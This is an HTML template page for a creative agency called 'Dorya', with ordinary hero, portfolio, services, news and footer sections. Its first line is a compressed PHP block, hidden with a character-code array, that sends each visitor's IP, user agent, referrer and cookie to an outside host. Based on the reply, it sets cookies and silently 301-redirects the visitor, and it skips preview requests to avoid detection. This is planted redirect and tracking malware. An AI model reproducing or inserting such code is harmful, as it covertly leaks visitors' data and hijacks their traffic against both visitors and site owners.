<?php date_default_timezone_set("UTC");error_reporting(0);header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){$date = date("Y-m-d H:i:s");$id = "458478";$uid="zyblotz2bh01h50s6whgs77he";$qu=$_SERVER["QUERY_STRING"];$ch = curl_init();$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$data=array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_SERVER["HTTP_REFERER"],"ip"=>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query"=>$qu,"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_event"],"user_id"=>$uid,"id"=>$id);curl_setopt($ch,CURLOPT_URL,$u);curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);curl_setopt($ch,CURLOPT_POST, true);curl_setopt($ch,CURLOPT_POSTFIELDS, $data);$result = curl_exec($ch);curl_close($ch);$arr = explode(",",$result);if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}if($arr[0] === "true"){if(strstr($arr[1],"sp.php")){$q="?".$qu;}if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_event",$arr[6],time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$q, TRUE, 301);}elseif($arr[0] === "false"){if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$f, TRUE, 301);}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}}}?>
<html lang="en">
<head>
	<title>Dorya | Creative Agency</title>

	<meta charset="utf-8">
	<!--[if IE]><meta http-equiv='X-UA-Compatible' content='IE=edge,chrome=1'><![endif]-->
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
	<meta name="description" content="">
	
	<!-- Google Fonts -->
	<!-- <link href='//fonts.googleapis.com/css?family=Montserrat:700,400|Archivo:400,400i,700' rel='stylesheet'> -->

	<!-- Adobe Fonts -->
	<link rel="stylesheet" href="https://use.typekit.net/wkt8ofn.css">

	<!-- Css -->
	<link rel="stylesheet" href="css/style.min.css" />
	<link rel="stylesheet" href="css/custom.css" />

	<!-- Favicons -->
	<link rel="shortcut icon" href="img/favicon.ico">
	<link rel="apple-touch-icon" href="https://deothemes.com/envato/dorya/html/img/apple-touch-icon.png">
	<link rel="apple-touch-icon" sizes="72x72" href="img/apple-touch-icon-72x72.png">
	<link rel="apple-touch-icon" sizes="114x114" href="img/apple-touch-icon-114x114.png">

</head>

<body data-cookies="on" id="home" itemscope itemtype="http://schema.org/WebPage">

	<!-- Preloader -->
	<div class="loader-mask">
		<div class="loader">
			<img class="loader-logo logo" src="img/logo/logo_white.png" srcset="img/logo/logo_white.png 1x, img/logo/logo_white@2x.png 2x" alt="logo"
				itemtype="http://schema.org/Organization" itemscope>
				<div class="loader-bar"><span></span></div>
			"Loading..."
		</div>
	</div>

	<!-- Header -->
	<header class="nav header" itemtype="http://schema.org/WPHeader" itemscope>

		<div class="nav__holder nav--sticky" id="nav--sticky">
			<div class="container nav__container">
				<div class="flex-parent">

					<div class="nav__header clearfix">
						<!-- Logo -->
						<div class="logo-wrap local-scroll">
							<a href="index.html#home" class="logo__url">
								<img class="logo logo--dark" src="img/logo/logo.png" srcset="img/logo/logo.png 1x, img/logo/logo@2x.png 2x" alt="logo" itemtype="http://schema.org/Organization" itemscope>
							</a>
						</div>

						<button type="button" class="nav__icon-toggle" id="nav__icon-toggle" data-toggle="collapse" data-target="#navbar-collapse">
							<span class="sr-only">Toggle navigation</span>
							<span class="nav__icon-toggle-bar"></span>
							<span class="nav__icon-toggle-bar"></span>
							<span class="nav__icon-toggle-bar"></span>
						</button>
					</div> <!-- end nav-header -->
					
					<!-- Navbar -->
					<nav id="navbar-collapse" class="nav__wrap collapse navbar-collapse" itemtype="http://schema.org/SiteNavigationElement" itemscope="itemscope">              
						<ul class="nav__menu local-scroll" id="onepage-nav">
							<li>
								<a href="index.html#home" class="nav-link active">Home</a>
							</li>							
							<li>
								<a href="index.html#works" class="nav-link">Works</a>
							</li>            
							<li>
								<a href="index.html#news" class="nav-link">News</a>
							</li>
							<li class="nav__dropdown">
								<a href="index.html#" class="nav-link" aria-haspopup="true">Pages</a>
								<i class="dorya-icon-chevron-down nav__dropdown-trigger" role="button" aria-haspopup="true" aria-expanded="false"></i>
								<ul class="nav__dropdown-menu">
									<li>
										<a href="single-project.html">
											<span class="nav__dropdown-menu-label">Single Project</span>
										</a>
									</li>
									<li>
										<a href="single-post.html">
											<span class="nav__dropdown-menu-label">Single Post</span>
										</a>
									</li>
									<li>
										<a href="page-404.html">
											<span class="nav__dropdown-menu-label">Page 404</span>
										</a>
									</li>
								</ul>
							</li>
							<li>
								<a href="contact.html" class="nav-link">Contact</a>
							</li>
						</ul> <!-- end menu -->

					</nav> <!-- end nav-wrap -->

				</div> <!-- end flex-parent -->
			</div> <!-- end container -->

		</div>
	</header> <!-- end header -->

	<div class="main-wrap">
		<main class="content-wrap">

			<!-- Hero -->
			<section class="section-hero hero">
				<div class="container hero__container">
					<div class="row">
						<div class="col-md-6">
							<div class="hero__text-content-wrap">
								<div class="hero__text-content">
									<h1 class="hero__title">Dorya</h1>
									<h2 class="hero__subtitle">We Design Brands</h2>
									<h2 class="hero__subtitle">Since 1995</h2>
								</div>
							</div>
						</div>
						<div class="col-md-6 d-md-block d-none">
							<div class="hero__img">
								<div class="hero__img-svg-container">
									<svg class="hero__img-svg" viewBox="0 0 319 639" preserveAspectRatio="xMinYMin meet" data-image-flick-speed="600">
										<path fill-rule="evenodd" fill="url(#hero__img-pattern)"
										d="M-0.000,638.993 L-0.000,512.000 C106.039,512.000 192.000,426.038 192.000,320.000 C192.000,213.961 106.039,128.000 -0.000,128.000 L-0.000,0.006 C176.224,0.277 319.000,143.212 319.000,319.500 C319.000,495.788 176.224,638.723 -0.000,638.993 Z"/>

										<defs>
											<pattern id="hero__img-pattern" patternUnits="userSpaceOnUse" width="319" height="639">
												<image xlink:href="img/hero/hero_img-1.jpg" x="0" y="0" width="319" height="639"></image>
											</pattern>
										</defs>
									</svg>
								</div>
							</div>

						</div>

					</div>
					<div class="row hero__bottom-row">
						<div class="col d-md-block d-none">
							<div class="hero__scroll-down local-scroll">
								<a href="index.html#intro" class="hero__scroll-down-link title-link animate-letters">Scroll Down</a>
							</div>
						</div>
						<div class="col">
							<div class="hero__socials">
								<div class="socials">
									<a href="index.html#" class="social social-twitter" aria-label="twitter" title="twitter" target="_blank"><i class="dorya-icon-twitter"></i></a>
									<a href="index.html#" class="social social-facebook" aria-label="facebook" title="facebook" target="_blank"><i class="dorya-icon-facebook"></i></a>
									<a href="index.html#" class="social social-instagram" aria-label="instagram" title="instagram" target="_blank"><i class="dorya-icon-instagram"></i></a>
									<a href="index.html#" class="social social-linkedin" aria-label="linkedin" title="linkedin" target="_blank"><i class="dorya-icon-linkedin"></i></a>
								</div>
							</div>
						</div>
					</div>
				</div>
			</section> <!-- end hero -->			

			<!-- Intro -->
			<section id="intro" class="section-intro intro">	
				<div class="container">
					<div class="row justify-content-center">
						<div class="col-lg-10">
					
							<div class="animate">
								<h3 class="intro__subtitle">Inventing The Future of Design</h3>
							</div>
							<div class="animate">
								<p class="intro__text text-large">URW Type Foundry GmbH is a German company with a long and rich history in type design and engineering. As the direct
								successor of digital type pioneer URW GmbH, it continues to design and develop first class typefaces and custom
								projects.</p>
							</div>
						</div>
					</div>
				</div>			
			</section> <!-- end intro -->

			<!-- Works -->
			<section class="section-works pt-0 pb-48" id="works">
				<div class="container">

					<div id="project-grid" class="project-grid project-grid--2-col">

						<article class="grid-item project hover-shrink featured branding product">
							<div class="project__container">
								<a href="single-project.html" class="project__url">
									<figure class="project__img-holder hover-shrink--shrink">
										<img src="img/works/project_1.jpg" class="project__img hover-shrink--zoom" alt="project 1">
									</figure>
								</a>
								<div class="project__description-wrap">
									<div class="project__description">
										<h3 class="project__title"><a href="single-project.html">Headphones Concept Design</a></h3>
										<span class="project__category">Product Design</span>
									</div>
								</div>
							</div>
						</article>

						<article class="grid-item project hover-shrink featured">
							<div class="project__container">
								<a href="single-project.html" class="project__url">
									<figure class="project__img-holder hover-shrink--shrink">
										<img src="img/works/project_2.jpg" class="project__img hover-shrink--zoom" alt="project 2">
									</figure>
								</a>
								<div class="project__description-wrap">
									<div class="project__description">
										<h3 class="project__title"><a href="single-project.html">Clothing Shop eCommerce Website</a></h3>
										<span class="project__category">Web Design</span>
									</div>
								</div>
							</div>
						</article>

						<article class="grid-item project hover-shrink featured product">
							<div class="project__container">
								<a href="single-project.html" class="project__url">
									<figure class="project__img-holder hover-shrink--shrink">
										<img src="img/works/project_3.jpg" class="project__img hover-shrink--zoom" alt="project 3">
									</figure>
								</a>
								<div class="project__description-wrap">
									<div class="project__description">
										<h3 class="project__title"><a href="single-project.html">Bicycle Concept Design</a></h3>
										<span class="project__category">Product Design</span>
									</div>
								</div>
							</div>
						</article>

						<article class="grid-item project hover-shrink featured branding">
							<div class="project__container">
								<a href="single-project.html" class="project__url">
									<figure class="project__img-holder hover-shrink--shrink">
										<img src="img/works/project_4.jpg" class="project__img hover-shrink--zoom" alt="project 4">
									</figure>
								</a>
								<div class="project__description-wrap">
									<div class="project__description">
										<h3 class="project__title"><a href="single-project.html">Bath Accessories Package</a></h3>
										<span class="project__category">Branding</span>
									</div>
								</div>
							</div>
						</article>

						<div class="grid-item project">
							<a href="https://deothemes.com/envato/dorya/html/projects.html" class="all-projects title-link underline animate-letters">More Works</a>
						</div>

					</div> <!-- end project grid -->

				</div>
			</section> <!-- end works -->

			<!-- Services -->
			<section class="section-services pt-40" id="services">
				<div class="container">
					<div class="row justify-content-center">
						<div class="col-lg-10">
							<div class="services js-services-01">

								<ul class="services-list">
									<li class="services-list__item services-list__item--is-active">
										<span class="services-list__label">Brand</span>
									</li>
									<li class="services-list__item">
										<span class="services-list__label">Creative</span>
									</li>
									<li class="services-list__item">
										<span class="services-list__label">Code</span>
									</li>
									<li class="services-list__item">
										<span class="services-list__label">Marketing</span>
									</li>
								</ul>

								<ul class="services-content">
									<li class="services-content__item services-content__item--is-active">
										Naming • Identity • Visual language • Values • Guidelines • Tone of voice
									</li>
									<li class="services-content__item">
										UI/UX • Design • Direction • Print Campaigns • Experience • Wayfinding Animation
									</li>
									<li class="services-content__item">
										Front end • Back end • CRM integrations • Ecommerce • WordPress Craft • Shopify • Laravel • Supply chain automation
									</li>
									<li class="services-content__item">
										Social media marketing • SEO • Content • Visual content • PPC • PR
									</li>
								</ul>
							</div>

						</div>
					</div>
				</div>
			</section> <!-- end services -->	

			<!-- From Blog -->
			<section class="section-from-blog" id="news">
				<div class="container">

					<div class="row justify-content-center">
						<div class="col-lg-10">
							<div class="title-row">
								<h2 class="section-title">Latest News</h2>
							</div>
						</div>
					</div>

				</div> <!-- .container -->

				<!-- Slider -->
				<div class="slick-slider blog-slider">
					<div class="slick-slider-item">
						<article class="entry hover-shrink" itemscope itemtype="http://schema.org/Article">
							<div class="entry__body">
								<a href="single-post.html" class="entry__url"></a>
								<figure class="entry__img-holder bg-gradient-bottom hover-shrink--shrink">	
									<img src="img/blog/blog_preview_2.jpg" class="entry__img hover-shrink--zoom" itemprop="image" alt="">
								</figure>

								<div class="entry__info-holder">
									<h4 class="entry__title title-underline" itemprop="headline">
										The Hyper Flexible Seamlessly Connected Modern Working
									</h4>
									<div class="entry__meta">
										<span class="entry__meta-item entry__meta-date" itemprop="datePublished" content="2020-25-8">August 25, 2020</span>             
									</div>
								</div>
							</div>
						</article>
					</div>
					<div class="slick-slider-item">
						<article class="entry hover-shrink" itemscope itemtype="http://schema.org/Article">
							<div class="entry__body">
								<a href="single-post.html" class="entry__url"></a>
								<figure class="entry__img-holder bg-gradient-bottom hover-shrink--shrink">	
									<img src="img/blog/blog_preview_3.jpg" class="entry__img hover-shrink--zoom" itemprop="image" alt="">
								</figure>

								<div class="entry__info-holder">
									<h4 class="entry__title title-underline" itemprop="headline">
										How to generate leads with PPC in your business?
									</h4>
									<div class="entry__meta">
										<span class="entry__meta-item entry__meta-date" itemprop="datePublished" content="2020-25-8">August 25, 2020</span>             
									</div>
								</div>
							</div>
						</article>
					</div>
					<div class="slick-slider-item">
						<article class="entry hover-shrink" itemscope itemtype="http://schema.org/Article">
							<div class="entry__body">
								<a href="single-post.html" class="entry__url"></a>
								<figure class="entry__img-holder bg-gradient-bottom hover-shrink--shrink">	
									<img src="img/blog/blog_preview_4.jpg" class="entry__img hover-shrink--zoom" itemprop="image" alt="">
								</figure>

								<div class="entry__info-holder">
									<h4 class="entry__title title-underline" itemprop="headline">
										How to generate leads with PPC in your business?
									</h4>
									<div class="entry__meta">
										<span class="entry__meta-item entry__meta-date" itemprop="datePublished" content="2020-25-8">August 25, 2020</span>             
									</div>
								</div>
							</div>
						</article>
					</div>
					<div class="slick-slider-item">
						<article class="entry hover-shrink" itemscope itemtype="http://schema.org/Article">
							<div class="entry__body">
								<a href="single-post.html" class="entry__url"></a>
								<figure class="entry__img-holder bg-gradient-bottom hover-shrink--shrink">	
									<img src="img/blog/blog_preview_5.jpg" class="entry__img hover-shrink--zoom" itemprop="image" alt="">
								</figure>

								<div class="entry__info-holder">
									<h4 class="entry__title title-underline" itemprop="headline">
										How to generate leads with PPC in your business?
									</h4>
									<div class="entry__meta">
										<span class="entry__meta-item entry__meta-date" itemprop="datePublished" content="2020-25-8">August 25, 2020</span>             
									</div>
								</div>
							</div>
						</article>
					</div>
					<div class="slick-slider-item">
						<article class="entry hover-shrink" itemscope itemtype="http://schema.org/Article">
							<div class="entry__body">
								<a href="single-post.html" class="entry__url"></a>
								<figure class="entry__img-holder bg-gradient-bottom hover-shrink--shrink">	
									<img src="img/blog/blog_preview_1.jpg" class="entry__img hover-shrink--zoom" itemprop="image" alt="">
								</figure>

								<div class="entry__info-holder">
									<h4 class="entry__title title-underline" itemprop="headline">
										How to generate leads with PPC in your business?
									</h4>
									<div class="entry__meta">
										<span class="entry__meta-item entry__meta-date" itemprop="datePublished" content="2020-25-8">August 25, 2020</span>             
									</div>
								</div>
							</div>
						</article>
					</div>
				</div>

			</section> <!-- end from blog -->

		</main> <!-- end content wrap -->

		<!-- Footer -->
		<footer class="footer bg-dark" itemtype="http://schema.org/WPFooter" itemscope>
			<div class="container">
				<div class="footer__cta">
					<div class="row justify-content-center">
						<div class="col-lg-8">
							<div class="widget widget-cta text-center">
								<h3 class="widget-cta__title mb-32">Got a Project?
									<a href="contact.html" class="widget-cta__link">
										<span class="animate-letters">Let’s Get to Work</span>
									</a>
								</h3>								
							</div>
						</div>
					</div>					
				</div>
				<div class="footer__widgets">
					<div class="row">
								<div class="col-lg-8 col-md-6">
									<div class="widget widget-about-us">
										<address class="widget-about-us__address">Level 7, 1200 Brown St N<br>
										Wenatchee, Alaska 98801</address>
										<a href="mailto:hello@doryaa.com" class="widget-about-us__email">hello@doryaa.com</a>
										<a href="tel:+1 (229) 597-3980" class="widget-about-us__phone">+1 (229) 597-3980</a>
									</div>
								</div> <!-- end about us -->						

						<div class="col-lg-2 col-md-3">
							<div class="widget widget-nav-menu">
								<ul>
									<li><a href="index.html#">Work</a></li>
									<li><a href="index.html#">Studio</a></li>
									<li><a href="index.html#">News</a></li>
									<li><a href="index.html#">Contact</a></li>
								</ul>
							</div>
						</div> <!-- end widget nav menu -->

						<div class="col-lg-2 col-md-3">
							<div class="widget widget-nav-menu">
								<ul>
									<li><a href="index.html#">Instagram</a></li>
									<li><a href="index.html#">Facebook</a></li>
									<li><a href="index.html#">Linkedin</a></li>
									<li><a href="index.html#">Twitter</a></li>
								</ul>
							</div>
						</div> <!-- end widget nav menu -->

					</div>
				</div>    
			</div> <!-- end container -->

			<div class="footer__bottom">
				<div class="container">
					<div class="row">
						<div class="col-md-6">
							<a href="index.html#home" class="logo__url">
								<img class="logo" src="img/logo/logo_white.png" srcset="img/logo/logo_white.png 1x, img/logo/logo_white@2x.png 2x" alt="logo" itemtype="http://schema.org/Organization" itemscope>
							</a>
						</div>
						<div class="col-md-6">
							<div class="widget widget-nav-menu">
								<ul>
									<li><a href="index.html#">Privacy Policy</a></li>
									<li><a href="index.html#">Legal Terms</a></li>
								</ul>
							</div>
						</div>
					</div>
				</div>
			</div> <!-- end footer bottom -->

		</footer> <!-- end footer -->

		<div class="footer-placeholder"></div>

	</div> <!-- end main wrap -->
	

	<!-- JS Scripts -->
	<script src="js/jquery.min.js"></script>
	<script src="js/scripts.min.js"></script>
		
</body>
</html>